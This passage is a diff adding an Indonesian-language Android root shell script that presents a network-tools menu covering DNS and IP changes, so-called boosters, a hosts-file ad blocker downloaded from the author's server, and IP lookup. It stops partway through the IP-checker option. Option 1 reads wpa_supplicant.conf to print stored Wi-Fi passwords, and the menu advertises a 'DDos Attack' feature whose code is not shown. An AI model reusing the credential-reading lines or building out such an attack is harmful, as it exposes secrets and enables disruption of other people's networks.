@@ -1,0 +1,2171 @@
+#!/system/bin/sh
+# Codename : Zero
+# Maker : nano
+#
+#This is building with heart for you who as used this tool, but you must to know if this open source
+#file and you can edit this file or modify this tool, but don't delete this text, codename or maker name.
+#This so hard for me to make this file to easily given command on terminal android.
+#
+#I hope you can enjoy to use it.
+#You can donate me with Bitcoin
+#
+#Address Bitcoin is 
+#Thanks for all forum, linux forum, and Allah for my idea and knowledge to make this.
+#And Thanks for you and big thanks for donator.
+mount -o rw,remount /system
+mount -o rw,remount /data
+mount -o rw,remount /cache
+clear
+ijinsistem="Mengatur sistem perizinan..."
+pasangsistem="Memasang berkas kedalam sistem..."
+balek="Enter untuk kembali..."
+fullcache="/data/data/*/cache/.* /data/data/*/code_cache/.* /sdcard/*/.tmp/* /sdcard/*/*/.tmp/* /sdcard/.tmp/* /sdcard/*/.tmp/* /sdcard/*/*/.tmp/* /sdcard/*/*/*/.tmp/* /data/data/*/cache/* /data/data/*/code_cache/* /sdcard/Android/data/.*cache/* /sdcard/Android/data/*/cache/* /sdcard/*/.ads/* /sdcard/*/*/.ads/* /sdcard/*/*/*/.ads/* /sdcard/*/Cache/* /sdcard/*/*/Cache/* /sdcard/.*cache/* /sdcard/*/.*cache/* /sdcard/*/*/.*cache/* /sdcard/*cache/* /sdcard/*/*cache/* /sdcard/*/*/*cache/* /sdcard/DCIM/.thumbnails/* /sdcard/DCIM/.thumbnails/.* /sdcard/UCDownloads/cache/* /data/anr/* /data/cache/* /data/log/* /data/tombstones/* /data/backup/pending/* /data/system/dropbox/* /sdcard/LOST.DIR /data/system/usagestats/* /data/*.log /data/*.txt /data/backup/pending/*.tmp /data/cache/*.* /data/dalvik-cache/*.apk /data/dalvik-cache/*.tmp /data/dalvik-cache/*.log /data/dalvik-cache/*.txt /data/data/*.log /data/data/*.txt /data/log/*.log /data/log/*.txt /data/local/*.apk /data/local/*.log /data/local/*.txt /data/last_alog/*.log /data/last_alog/*.txt /data/last_kmsg/*.log /data/last_kmsg/*.txt /data/mlog/* /data/system/*.log /data/system/*.txt /data/local/tmp/* /data/tmp/* /data/system/appusagestats/* /mnt/expand/*/user*/*"
+fullapk="/sdcard/*.apk /sdcard/*/*.apk /sdcard/*/*/*.apk /sdcard/*/*/*/*.apk /sdcard/*/*/*/*/*.apk /sdcard/*/*/*/*/*/*.apk /sdcard/*/*/*/*/*/*.apk /sdcard/*/*/*/*/*/*/*.apk"
+id=`id`; id=`echo ${id#*=}`; id=`echo ${id%%\(*}`; id=`echo ${id%% *}`
+if [ "$id" != "0" ] && [ "$id" != "root" ]; then
+echo "Belum melakukan akses ROOT"
+sleep 3
+exit
+fi
+if [[ -f /system/xbin/busybox && -f /system/bin/busybox ]]; then
+	echo "BUSYBOX belum di install"
+	exit
+fi
+if [ ! -f /system/bin/n ]; then
+	echo "nettool" >> /system/bin/n
+	chmod 775 /system/bin/n
+	echo "Sekarang NETTOOL bisa dipanggil dengan perintah 'n'saja"
+	sleep 3
+fi
+if [ ! -f /data/lognettool/pingtool.txt ]; then
+	echo "snbdc-dns2.xl.net.id" >> /data/lognettool/pingtool.txt;
+fi
+if [ ! -f /data/lognettool/pingtime.txt ]; then
+	echo "0.5" >> /data/lognettool/pingtime.txt;
+fi
+if [ ! -d /sdcard/netdir/ ]; then mkdir /sdcard/netdir/ 2> /dev/null; fi
+if [ ! -d /data/lognettool/ ]; then mkdir /data/lognettool/ 2> /dev/null; fi
+filetmp=/data/lognettool
+tmpsd=/sdcard/netdir
+if [ -f $filetmp/ddos1.py ]; then rm -f $filetmp/ddos1.py; fi
+if [ -f $filetmp/ddos2.py ]; then rm -f $filetmp/ddos2.py; fi
+if [ -f $filetmp/ddos3.py ]; then rm -f $filetmp/ddos3.py; fi
+if [ -f $filetmp/ddos4.py ]; then rm -f $filetmp/ddos4.py; fi
+if [ -f $filetmp/ilucx.pyc ]; then rm -f $filetmp/ilucx.pyc; fi
+if [ -f $filetmp/ilucx2.pyc ]; then rm -f $filetmp/ilucx2.pyc; fi
+if [ -f $filetmp/hostterinstall1 ]; then
+	hostiklan="\e[1;32mHidup\e[0m"
+else
+	hostiklan="\e[1;31mMati\e[0m"
+fi
+if [ -f $filetmp/.blokiriklan.sh ]; then rm $filetmp/.blokiriklan.sh 2> /dev/null; fi
+if [ `ifconfig wlan0 2>/dev/null | grep inet\ addr | wc -l` -eq 0 ]; then
+	wistat="\e[1;31m                   Wifi Tidak Aktif\e[0m"
+	wistat1="\e[1;31mWifi Tidak Tersambung\e[0m"
+else
+	wistat="\e[1;32m                      Wifi AKtif\e[0m"
+	wistat1="\e[1;32m`ifconfig wlan0 2>/dev/null | grep "inet " | awk -F'[: ]+' '{ print $4 }'`\e[0m"
+fi
+if [ `ifconfig wlan0 2>/dev/null | grep "HWaddr " | wc -l` -eq 0 ]; then
+	wistat2="\e[1;31mHidupkan Wifi\e[0m"
+else
+	wistat2="\e[1;32m`ifconfig wlan0 2>/dev/null | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`\e[0m"
+fi
+if [ `ifconfig rmnet_data0 2>/dev/null | grep inet\ addr | wc -l` -eq 1 ]; then
+	dataku="\e[1;32m`ifconfig rmnet_data0 2>/dev/null | grep "inet " | awk -F'[: ]+' '{ print $4 }'`\e[0m"
+elif [ `ifconfig rmnet_data1 2>/dev/null | grep inet\ addr | wc -l` -eq 1 ]; then
+	dataku="\e[1;32m`ifconfig rmnet_data1 2>/dev/null | grep "inet " | awk -F'[: ]+' '{ print $4 }'`\e[0m"
+elif [ `ifconfig rmnet_data2 2>/dev/null | grep inet\ addr | wc -l` -eq 1 ]; then
+	dataku="\e[1;32m`ifconfig rmnet_data2 2>/dev/null | grep "inet " | awk -F'[: ]+' '{ print $4 }'`\e[0m"
+elif [ `ifconfig rmnet_data3 2>/dev/null | grep inet\ addr | wc -l` -eq 1 ]; then
+	dataku="\e[1;32m`ifconfig rmnet_data3 2>/dev/null | grep "inet " | awk -F'[: ]+' '{ print $4 }'`\e[0m"
+elif [ `ifconfig rmnet_data4 2>/dev/null | grep inet\ addr | wc -l` -eq 1 ]; then
+	dataku="\e[1;32m`ifconfig rmnet_data4 2>/dev/null | grep "inet " | awk -F'[: ]+' '{ print $4 }'`\e[0m"
+elif [ `ifconfig rmnet_data5 2>/dev/null | grep inet\ addr | wc -l` -eq 1 ]; then
+	dataku="\e[1;32m`ifconfig rmnet_data5 2>/dev/null | grep "inet " | awk -F'[: ]+' '{ print $4 }'`\e[0m"
+elif [ `ifconfig rmnet_data6 2>/dev/null | grep inet\ addr | wc -l` -eq 1 ]; then
+	dataku="\e[1;32m`ifconfig rmnet_data6 2>/dev/null | grep "inet " | awk -F'[: ]+' '{ print $4 }'`\e[0m"
+else
+	dataku="\e[1;31mData Tidak Aktif\e[0m"
+fi
+if [ -f `getprop net.dns1` ]; then
+	dns1ku="DNS Tidak Ada"
+else
+	dns1ku="\e[93m`getprop net.dns1`\e[0m"
+fi
+if [ -f `getprop net.dns2` ]; then
+	dns2ku="DNS Tidak Ada"
+else
+	dns2ku="\e[93m`getprop net.dns2`\e[0m"
+fi
+if [ `arp -a 2>/dev/null | grep "?" | awk '{print $2}' | wc -l 2>/dev/null` -eq 1 ]; then
+	iphost="     \e[1;32m`arp -a | awk '{print $2}' 2>/dev/null`\e[0m"
+else
+	iphost="Sambungan Tidak Tersedia"
+fi
+if [ `arp -a 2>/dev/null | grep "at" | awk '{print $4}' | wc -l 2>/dev/null` -eq 1 ]; then
+	hwhost="      \e[1;32m(`arp -a | awk '{print $4}' 2>/dev/null`)\e[0m"
+else
+	hwhost="Sambungan Tidak Tersedia"
+fi
+if [ -f $filetmp/bckprstr ]; then
+	blokstat="\e[1;31mNonaktif\e[0m"
+elif [[ ! -f $filetmp/hostterinstall ]]; then
+	blokstat="\e[1;31mNonaktif\e[0m"
+else
+	blokstat="\e[1;32mAktif\e[0m"
+fi
+if ping -q -c 1 -W 1 google.com >/dev/null; then
+	if [ `curl -sI http://sudonano.pe.hu/nettool/nettool | grep Length: | awk '{print $2}'` == `wc -c /system/bin/nettool | awk '{print $1}'` &> /dev/null ]; then
+		newing="\e[1;32mTerbaru\e[0m"
+	else
+		newing="\e[93mTersedia\e[0m"
+	fi
+else
+	newing="Sambungan Tidak Tersedia"
+fi
+clear
+echo "=========================================================="
+echo "          NETWORK TOOLS 2017  Powered by Nano             "
+echo "=========================================================="
+echo "             IP            |          MAC Address         "
+echo -n "  $iphost      "
+echo -n "$hwhost"
+echo ""
+echo -n "\e[1;30mTerdeteksi: \e[0m" 
+getprop net.hostname
+echo -n "\e[1;36mIP WIFI: \e[0m" 
+echo $wistat1
+echo -n "\e[1;36mMAC Address : \e[0m" 
+echo $wistat2
+echo -n "\e[1;36mIP Data: \e[0m" 
+echo $dataku
+echo -n "\e[1;36mDNS 1: \e[0m" 
+echo $dns1ku
+echo -n "\e[1;36mDNS 2: \e[0m" 
+echo $dns2ku
+echo -n "\e[1;36mStatus Adblock: \e[0m" 
+echo $blokstat
+echo -n "\e[1;36mPembaruan: \e[0m"
+echo $newing
+echo "=========================================================="
+echo "Menu Net tools:"
+echo "\e[1;35m1. Recovery Kata Sandi Wifi\e[0m"
+echo "\e[1;35m2. Ganti DNS\e[0m"
+echo "\e[1;35m3. Dapatkan IP Address\e[0m"
+echo "\e[1;35m4. Ganti IP Address (IP WIFI)\e[0m"
+echo "\e[1;35m5. Internet Booster\e[0m"
+echo "\e[1;35m6. Sinyal Booster\e[0m"
+echo "\e[1;35m7. Latency Booster (Untuk Game Online)\e[0m"
+echo "\e[1;35m8. Pengaturan Adblock\e[0m"
+echo "\e[1;35m9. Deteksi IP (Matikan AdBlock)\e[0m"
+echo "\e[1;35m10. Deteksi Pemilik IP (Matikan AdBlock)\e[0m"
+echo "\e[1;35m11. DDos Attack\e[0m"
+echo "\e[1;35m12. Jalankan Terminal Bash LD\e[0m"
+echo "=========================================================="
+echo "\e[90m20. Utilitas\e[0m"
+echo "\e[90m21. Entropy\e[0m"
+echo "\e[90m0. Segarkan\e[0m"
+echo "=========================================================="
+echo -n "Pilih angka yang tersedia: "
+read option
+if [ $option -eq 1 ]; then
+	clear
+	echo ""
+	echo "                  Wifi Password Recovery            "
+	echo ""
+	echo -n "Nama Wifi: "
+	cat /data/misc/wifi/wpa_supplicant.conf | grep -E "ssid=" | awk -F'"' '{print $2}'
+	echo -n "Pass: "
+	cat /data/misc/wifi/wpa_supplicant.conf | grep -E "psk=" | awk -F'"' '{print $2}'
+	echo ""
+	echo "                   Enter untuk  kembali"
+	read enterKey
+	nettool
+elif [ $option -eq 2 ]; then
+	clear
+	echo ""
+	echo "\e[1;34m                     DNS Changer\e[0m"
+	echo ""
+	echo "\e[1;35mGanti DNS:\e[0m"
+	echo "\e[1;35m1. Google DNS\e[0m"
+   	echo "\e[1;35m2. OpenDNS\e[0m"
+   	echo "\e[1;35m3. OpenDNS Family Shield\e[0m"
+   	echo "4. Kembali"
+	echo ""
+	echo -n "Pilih angka yang tersedia: "
+	read milihdns 
+		if [ $milihdns -eq 1 ]; then
+			setprop net.rmnet0.dns1 8.8.8.8
+			setprop net.rmnet0.dns2 8.8.4.4
+			setprop net.ppp0.dns1 8.8.8.8
+			setprop net.ppp0.dns2 8.8.4.4
+			setprop net.dns1 8.8.8.8
+			setprop net.dns2 8.8.4.4
+   			sleep 1
+   			echo "Google DNS Sukses"
+   			sleep 2
+   			nettool
+		elif [ $milihdns -eq 2 ]; then
+			setprop net.rmnet0.dns1 208.67.222.222
+			setprop net.rmnet0.dns2 208.67.220.220
+			setprop net.ppp0.dns1 208.67.222.222
+			setprop net.ppp0.dns2 208.67.220.220
+			setprop net.dns1 208.67.222.222
+			setprop net.dns2 208.67.220.220
+   			sleep 1
+   			echo "OpenDNS Sukses"
+   			sleep 2
+   			nettool
+   		elif [ $milihdns -eq 3 ]; then
+   			setprop net.rmnet0.dns1 208.67.222.123
+   			setprop net.rmnet0.dns2 208.67.220.123
+   			setprop net.ppp0.dns1 208.67.222.123
+   			setprop net.ppp0.dns2 208.67.220.123
+			setprop net.dns1 208.67.222.123
+   			setprop net.dns2 208.67.220.123
+   			sleep 1
+   			echo "OpenDNS Family Shield Sukses"
+   			sleep 2
+   			nettool
+   		elif [ $milihdns -eq 4 ]; then
+   			nettool
+		else
+			echo "Perintah salah"
+			sleep 1
+			exit
+		fi
+elif [ $option -eq 3 ]; then
+	clear
+	echo ""
+	echo "                      Ping Tool"
+	echo ""
+	echo "Silahkan tulis domain.."
+	echo -n "Domain: "
+	read fing
+	echo `ping -c 1 $fing 2>/dev/null | grep "PING" | awk '{ print $3 }'` > $tmpsd/ShowIp.txt;
+	echo -n "IP "$fing" adalah "
+	ping -c 1 $fing 2>/dev/null | grep "PING" | awk '{ print $3 }'
+	echo ""
+	echo "Alamat IP terdapat di file ShowIp.txt di luar folder memori internal"
+	echo -n "Tekan enter.."
+	read enterKey
+	nettool
+elif [ $option -eq 4 ]; then
+	clear
+	echo ""
+	echo "                   IP Changer"
+	echo ""
+	if [ `ifconfig wlan0 | wc -l 2>/dev/null` -eq 0 ]; then
+		echo ""
+		echo "Hidupkan wifi terlebih dahulu"
+		sleep 3
+		nettool
+	else
+		echo ""
+		echo "IP WIFI terakhir "
+		ifconfig wlan0 | grep "inet " | awk -F'[: ]+' '{ print $4 }'
+		echo "Default gateway adalah 192.168.x.1"
+		echo ""
+		echo ""
+		sleep 1
+		echo -n "Silahkan masukkan baris 3 angka terakhir 1-255:"
+		read gantiip
+		echo -n "Silahkan masukkan baris 4 angka terakhir 1-255:"
+		read gantiip1
+		if [ $gantiip 2>/dev/null -gt "255" ]; then
+			echo "Value yang dimaksukkan lebih dari 255"
+			echo "Proses dibatalkan.."
+			sleep 5
+			nettool
+		elif [ $gantiip 2>/dev/null -lt "1" ]; then
+			echo "Value yang dimaksukkan kurang dari 1"
+			echo "Proses dibatalkan.."
+			sleep 5
+			nettool
+		elif [ $gantiip1 2>/dev/null -gt "255" ]; then
+			echo "Value yang dimaksukkan lebih dari 255"
+			echo "Proses dibatalkan.."
+			sleep 5
+			nettool
+		elif [ $gantiip1 2>/dev/null -lt "1" ]; then
+			echo "Value yang dimaksukkan kurang dari 1"
+			echo "Proses dibatalkan.."
+			sleep 5
+			nettool
+		else
+			echo "IP Address diganti"
+			ifconfig wlan0 192.168.$gantiip.$gantiip1/24
+			sleep 1
+			echo "Ganti IP sukses, mulai ulang koneksi untuk kembali ke semula"
+			echo -n "IP saat ini "
+			ifconfig wlan0 | grep "inet " | awk -F'[: ]+' '{ print $4 }'
+			echo ""
+			echo -n "Tekan enter"
+			read enterKey
+			nettool
+		fi
+	fi
+elif [ $option -eq 5 ]; then
+	echo "Internet Booster sedang di proses"
+	sleep 1
+	if [ `ifconfig wlan0 | wc -l 2>/dev/null` -eq 1 ]; then
+		svc wifi disable 2>/dev/null
+		svc wifi enable 2>/dev/null
+	fi
+	svc data disable 2>/dev/null
+	svc data enable 2>/dev/null
+	sleep 1
+	ip link set dev rmnet0 mtu 1500 2> /dev/null
+	ip link set dev rmnet1 mtu 1500 2> /dev/null
+	ip link set dev rmnet2 mtu 1500 2> /dev/null
+	ip link set dev rmnet3 mtu 1500 2> /dev/null
+	ip link set dev rmnet4 mtu 1500 2> /dev/null
+	ip link set dev rmnet5 mtu 1500 2> /dev/null
+	ip link set dev rmnet6 mtu 1500 2> /dev/null
+	ip link set dev rmnet7 mtu 1500 2> /dev/null
+	setprop persist.data_dsc_mtu 1500
+	setprop persist.data_netmgrd_mtu 1500
+	setprop net.tcp.buffersize.default 4096,62780,256960,4096,62780,256960
+	setprop net.tcp.buffersize.wifi 4096,62780,256960,4096,62780,256960
+	setprop net.tcp.buffersize.umts 4096,62780,256960,4096,62780,256960
+	setprop net.tcp.buffersize.edge 4096,62780,256960,4096,62780,256960
+	setprop net.tcp.buffersize.gprs 4096,62780,256960,4096,62780,256960
+	setprop net.tcp.buffersize.evdo 4096,62780,256960,4096,62780,256960
+	setprop net.tcp.buffersize.evdo_a 4096,62780,256960,4096,62780,256960
+	setprop net.tcp.buffersize.evdo_b 4096,62780,256960,4096,62780,256960
+	setprop net.tcp.buffersize.hsdpa 4096,62780,256960,4096,62780,256960
+	setprop net.tcp.buffersize.hsupa 4096,62780,256960,4096,62780,256960
+	setprop net.tcp.buffersize.lte 4096,62780,256960,4096,62780,256960
+	echo "0" > /proc/sys/net/ipv4/conf/default/secure_redirects;
+	echo "0" > /proc/sys/net/ipv4/conf/default/accept_redirects;
+	echo "0" > /proc/sys/net/ipv4/conf/default/accept_source_route;
+	echo "0" > /proc/sys/net/ipv4/conf/all/secure_redirects;
+	echo "0" > /proc/sys/net/ipv4/conf/all/accept_redirects;
+	echo "0" > /proc/sys/net/ipv4/conf/all/accept_source_route;
+	echo "0" > /proc/sys/net/ipv4/ip_forward;
+	echo "0" > /proc/sys/net/ipv4/ip_dynaddr;
+	echo "0" > /proc/sys/net/ipv4/ip_no_pmtu_disc;
+	echo "0" > /proc/sys/net/ipv4/tcp_ecn;
+	echo "0" > /proc/sys/net/ipv4/tcp_timestamps;
+	echo "1" > /proc/sys/net/ipv4/tcp_tw_reuse;
+	echo "1" > /proc/sys/net/ipv4/tcp_fack;
+	echo "1" > /proc/sys/net/ipv4/tcp_sack;
+	echo "1" > /proc/sys/net/ipv4/tcp_dsack;
+	echo "1" > /proc/sys/net/ipv4/tcp_rfc1337;
+	echo "1" > /proc/sys/net/ipv4/tcp_tw_recycle;
+	echo "1" > /proc/sys/net/ipv4/tcp_window_scaling;
+	echo "1" > /proc/sys/net/ipv4/tcp_moderate_rcvbuf;
+	echo "1" > /proc/sys/net/ipv4/tcp_no_metrics_save;
+	echo "2" > /proc/sys/net/ipv4/tcp_synack_retries;
+	echo "2" > /proc/sys/net/ipv4/tcp_syn_retries;
+	echo "5" > /proc/sys/net/ipv4/tcp_keepalive_probes;
+	echo "30" > /proc/sys/net/ipv4/tcp_keepalive_intvl;
+	echo "30" > /proc/sys/net/ipv4/tcp_fin_timeout;
+	echo "1800" > /proc/sys/net/ipv4/tcp_keepalive_time;
+	echo "256960" > /proc/sys/net/core/rmem_max;
+	echo "256960" > /proc/sys/net/core/wmem_max;
+	echo "256960" > /proc/sys/net/core/rmem_default;
+	echo "256960" > /proc/sys/net/core/wmem_default;
+	echo "4096,16384,404480" > /proc/sys/net/ipv4/tcp_wmem;
+	echo "4096,87380,404480" > /proc/sys/net/ipv4/tcp_rmem;
+	ndc resolver fushdefaultif &> /dev/null
+	setprop net.dns1 8.8.8.8
+	setprop net.dns2 8.8.4.4
+	setprop ro.ril.hsxpa 3
+	setprop ro.ril.gprsclass 32
+	setprop ro.ril.hsdpa.category 28
+	setprop ro.ril.hsupa.category 9
+	setprop ro.ril.enable.sdr 1
+	setprop ro.ril.enable.gea3 1
+	setprop ro.ril.enable.fd.plmn.prefix 23402,23410,23411
+	setprop ro.ril.enable.a52 0
+	setprop ro.ril.enable.a53 1
+	setprop ro.ril.enable.dtm 1
+	setprop ro.ril.hep 1
+	setprop ro.ril.enable.fd.plmn.prefix 23402,23410,23411
+	echo "Internet sudah di booster, lakukan lagi jika merasa jaringan lelet"
+	echo ""
+	echo -n "Tekan enter"
+	read enterKey
+	nettool
+elif [ $option -eq 6 ]; then
+	echo "Peningkatan sinyal akan di proses selama beberapa detik"
+	echo "Tunggu sebentar..."
+	sleep 3
+	settings put global airplane_mode_on 1 2>/dev/null
+	am broadcast -a android.intent.action.AIRPLANE_MODE &>/dev/null
+	echo "Mengatur sistem..."
+	sleep 2
+	setprop persist.cust.tel.eons 1
+	setprop ro.config.hw_fast_dormancy 1
+	setprop persist.cust.tel.eons 1
+	setprop ro.ril.gprsclass 32
+	setprop ro.ril.hsdpa.category 8
+	setprop ro.ril.hsupa.category 6
+	setprop ro.ril.hsxpa 1
+	setprop ro.ril.enable.sdr 1
+	setprop ro.ril.enable.gea3 1
+	setprop ro.ril.enable.fd.plmn.prefix 23402,23410,23411
+	setprop ro.ril.enable.a52 0
+	setprop ro.ril.enable.a53 1
+	setprop ro.ril.enable.dtm 1
+	sleep 3
+	echo "Mengatur kembali"
+	settings put global airplane_mode_on 0 2>/dev/null
+	am broadcast -a android.intent.action.AIRPLANE_MODE &>/dev/null
+	sleep 3
+	setprop net.dns1 8.8.8.8
+	setprop net.dns2 8.8.4.4
+	echo "Sinyal sudah di tingkatkan!"
+	echo $balek
+	read enterKey
+	nettool
+elif [ $option -eq 7 ]; then
+	echo ""
+	echo "Gunakan fungsi utilitas untuk mengganti Host."
+	echo "Gunakan tombol CTRL+Z atau Vol Down+Z untuk berhenti."
+	sleep 1
+	nanopingtool=`cat /data/lognettool/pingtool.txt`
+	nanopingtime=`cat /data/lognettool/pingtime.txt`
+	echo -n "Running..."
+	ping -i $nanopingtime -l 1 $nanopingtool &> /dev/null
+	nettool
+elif [ $option -eq 8 ]; then
+	clear
+	if [ ! -f $filetmp/komandohost ]; then
+		komando="2. Hidupkan AdBlock terlebih dahulu untuk menggunakan fitur ini"
+	elif [ ! -f $filetmp/bckprstr ]; then
+		komando="2. Nonaktifkan AdBlock Sementara"
+	else
+		komando="2. Aktifkan AdBlock Kembali"
+	fi
+	echo ""
+	echo "=========================================================="
+	echo "                       Blokir Iklan                       "
+	echo "=========================================================="
+	echo ""
+	echo "Status AdBlock: $hostiklan"
+	echo ""
+	echo "1. Hidupkan AdBlock"
+	echo $komando
+	echo "3. Hapus Permanen"
+	echo "0. Kembali"
+	echo ""
+	echo -n "Pilih perintah diatas: "
+	read iklannya
+	sleep 1
+	if [ $iklannya -eq 1 ]; then
+		echo -n "Cek koneksi"
+		sleep 1
+		echo -n "."
+		echo -n "."
+		sleep 1
+		echo -n "."
+		if ping -q -c 1 -W 1 google.com >/dev/null; then
+			echo "\e[1;32m OK!\e[0m"
+			sleep 1
+			if [ -f $filetmp/hostterinstall ]; then
+				echo "Iklan telah di blokir"
+				echo -n $balek
+				read enterKey
+				nettool
+			else
+				echo "Silahkan tunggu.."
+				wget -O $tmpsd/hosts.txt http://sudonano.pe.hu/hosts/hosts &> /dev/null
+				mv $tmpsd/hosts.txt /system/etc/hosts &> /dev/null
+				chmod 644 /system/etc/hosts &> /dev/null
+				echo "AdBlok Hidup" >> $filetmp/hostterinstall
+				echo "AdBlok Hidup" >> $filetmp/hostterinstall1
+				echo "AdBlok Hidup" >> $filetmp/komandohost
+				echo "Selesai.."
+				echo -n $balek
+				read enterKey
+				nettool
+			fi
+		else
+			echo "\e[1;31m GAGAL!\e[0m"
+			sleep 1
+			echo "Ulangi kembali"
+			echo -n $balek
+			read enterKey
+			nettool
+		fi
+	elif [ $iklannya -eq 2 ]; then
+		if [ -f  $filetmp/hostterinstall ]; then	
+			if [ ! -f $filetmp/bckprstr ]; then
+				mv /system/etc/hosts /system/etc/hosts.bakup
+				echo "127.0.0.1 localhost" >> /system/etc/hosts
+				echo "::1 ip6-localhost" >> /system/etc/hosts
+				echo "change" >> $filetmp/bckprstr
+				chmod 644 /system/etc/hosts
+				rm -f $filetmp/hostterinstall1
+				echo "Selesai mematikan sementara"
+				echo -n $balek
+				read enterKey
+				nettool
+			else
+				rm -f /system/etc/hosts 2>/dev/null
+				rm -f $filetmp/bckprstr 2>/dev/null
+				mv /system/etc/hosts.bakup /system/etc/hosts
+				chmod 664 /system/etc/hosts
+				echo "AdBlok Hidup" >> $filetmp/hostterinstall1
+				echo "AdBlock aktif kembali"
+				echo -n $balek
+				read enterKey
+				nettool
+			fi
+		else
+			echo "Hidupkan ADBLOCK terlebih dahulu"
+			echo $balek
+			read enterKey
+			nettool
+		fi
+	elif [ $iklannya -eq 3 ]; then
+		if [ -f $filetmp/hostterinstall ]; then
+			echo "Menghapus blokiran iklan"
+			sleep 3
+			rm -f $filetmp/komandohost
+			rm -f $filetmp/hostterinstall
+			rm -f $filetmp/hostterinstall1
+			rm -f /system/etc/hosts
+			rm -f $filetmp/bckprstr
+			echo '127.0.0.1 localhost' >> /system/etc/hosts
+			echo '::1 localhost #[IPv6]' >> /system/etc/hosts
+			chmod 644 /system/etc/hosts
+			echo "Selesai"
+			echo -n $balek
+			read enterKey
+			nettool
+		else
+			echo "Pemblokiran iklan belum di pasang, proses dibatalkan"
+			sleep 2
+			nettool
+		fi
+	elif [ $iklannya -eq 0 ]; then
+		nettool
+	else
+		clear
+		echo "Perintah salah"
+		sleep 2
+		exit
+	fi
+elif [ $option -eq 9 ]; then
+	clear
+	echo ""
+	echo "                      IP Checker              "
+	echo ""
+	echo "1. IP Saya"
+	echo "2. Custom IP"
+	echo "3. Kembali"
+	echo -n "Pilih menu di atas: "
+	read cekme
+	if [ $cekme -eq 1 ]; then
+		echo ""
+		lihat=`ifconfig rmnet_data0 2>/dev/null | grep "inet " | awk -F'[: ]+' '{ print $4 }'`
+		echo "IP/Domain: IP Saya"
+		echo ""
+		echo "                       IP Utama"
+		echo ""
+		echo -n "IP Data: "
+		curl ipinfo.io/$lihat 2>/dev/null | grep "ip" | awk '{ print $2, $3 }'
+		if [ `curl ipinfo.io/$lihat 2>/dev/null | grep "hostname" | awk '{ print $2, $3, $4 }' | wc -l 2>/dev/null` -eq 1 ]; then
+			echo -n "Hostname: "
+			curl ipinfo.io/$lihat 2>/dev/null | grep "hostname" | awk '{ print $2, $3, $4 }'
+		else
+			echo "Hostname: -"
+		fi
+		if [ `curl ipinfo.io/$lihat 2>/dev/null | grep "city" | awk '{ print $2, $3, $4 }' | wc -l 2>/dev/null` -eq 1 ]; then
+			echo -n "Kota: "
+			curl ipinfo.io/$lihat 2>/dev/null | grep "city" | awk '{ print $2, $3, $4 }'
+		else
+			echo "Kota: -"
+		fi
+		if [ `curl ipinfo.io/$lihat 2>/dev/null | grep "region" | awk '{ print $2, $3, $4 }' | wc -l 2>/dev/null` -eq 1 ]; then
+			echo -n "Wilayah: "
+			curl ipinfo.io/$lihat 2>/dev/null | grep "region" | awk '{ print $2, $3, $4 }'
+		else
+			echo "Wilayah: -"
+		fi
+		if [ `curl ipinfo.io/$lihat 2>/dev/null | grep "country" | awk '{ print $2, $3, $4 }' | wc -l 2>/dev/null` -eq 1 ]; then
+			echo -n "Negara: "
+			curl ipinfo.io/$lihat 2>/dev/null | grep "country" | awk '{ print $2, $3, $4 }'
+		else
+			echo "Negara: -"
+		fi
+		if [ `curl ipinfo.io/$lihat 2>/dev/null | grep "loc" | awk '{ print $2, $3, $4, $5 }' | wc -l 2>/dev/null` -eq 1 ]; then
+			echo -n "Lokasi: "
+			curl ipinfo.io/$lihat 2>/dev/null | grep "loc" | awk '{ print $2, $3, $4, $5 }'
+		else
+			echo "Lokasi: -"
+		fi
+		if [ `curl ipinfo.io/$lihat 2>/dev/null | grep "postal" | awk '{ print $2, $3, $4, $5, $6, $7, $8, $9, $10 }' | wc -l 2>/dev/null` -eq 1 ]; then
+			echo -n "Kode Pos: "
+			curl ipinfo.io/$lihat 2>/dev/null | grep "postal" | awk '{ print $2, $3, $4, $5, $6, $7, $8, $9, $10 }'
+		else
+			echo "Kode Pos: -"
+		fi
+		if [ `curl ipinfo.io/$lihat 2>/dev/null | grep "org" | awk '{ print $2, $3, $4, $5, $6, $7, $8, $9, $10 }' | wc -l 2>/dev/null` -eq 1 ]; then
+			echo -n "Organisasi: "
+			curl ipinfo.io/$lihat 2>/dev/null | grep "org" | awk '{ print $2, $3, $4, $5, $6, $7, $8, $9, $10 }'
+		else
+			echo "Organisasi: -"
+		fi
+		echo ""
+		echo ""
+		echo "                        PUBLIK"
+		echo ""
+		echo -n "IP Publik: "
+				curl ipinfo.io/ 2>/dev/null | grep "ip" | awk '{ print $2, $3 }'
+		if [ `curl ipinfo.io/ 2>/dev/null | grep "hostname" | awk '{ print $2, $3, $4 }' | wc -l 2>/dev/null` -eq 1 ]; then
+					echo -n "Hostname: "
+					curl ipinfo.io/ 2>/dev/null | grep "hostname" | awk '{ print $2, $3, $4 }'
+				else
+					echo "Hostname: -"
+				fi
+		if [ `curl ipinfo.io/ 2>/dev/null | grep "city" | awk '{ print $2, $3, $4 }' | wc -l 2>/dev/null` -eq 1 ]; then
+					echo -n "Kota: "
+					curl ipinfo.io/ 2>/dev/null | grep "city" | awk '{ print $2, $3, $4 }'
+				else
+					echo "Kota: -"
+				fi
+		if [ `curl ipinfo.io/ 2>/dev/null | grep "region" | awk '{ print $2, $3, $4 }' | wc -l 2>/dev/null` -eq 1 ]; then
+					echo -n "Wilayah: "
+					curl ipinfo.io/ 2>/dev/null | grep "region" | awk '{ print $2, $3, $4 }'
+				else
+					echo "Wilayah: -"
+				fi
+		if [ `curl ipinfo.io/ 2>/dev/null | grep "country" | awk '{ print $2, $3, $4 }' | wc -l 2>/dev/null` -eq 1 ]; then
+					echo -n "Negara: "
+					curl ipinfo.io/ 2>/dev/null | grep "country" | awk '{ print $2, $3, $4 }'
+				else
+					echo "Negara: -"
+				fi
+		if [ `curl ipinfo.io/ 2>/dev/null | grep "loc" | awk '{ print $2, $3, $4, $5 }' | wc -l 2>/dev/null` -eq 1 ]; then
+					echo -n "Lokasi: "
+					curl ipinfo.io/ 2>/dev/null | grep "loc" | awk '{ print $2, $3, $4, $5 }'
+				else
+					echo "Lokasi: -"
+				fi
+		if [ `curl ipinfo.io/ 2>/dev/null | grep "postal" | awk '{ print $2, $3, $4, $5, $6, $7, $8, $9, $10 }' | wc -l 2>/dev/null` -eq 1 ]; then
+					echo -n "Kode Pos: "
+					curl ipinfo.io/ 2>/dev/null | grep "postal" | awk '{ print $2, $3, $4, $5, $6, $7, $8, $9, $10 }'
+				else
+					echo "Kode Pos: -"
+				fi
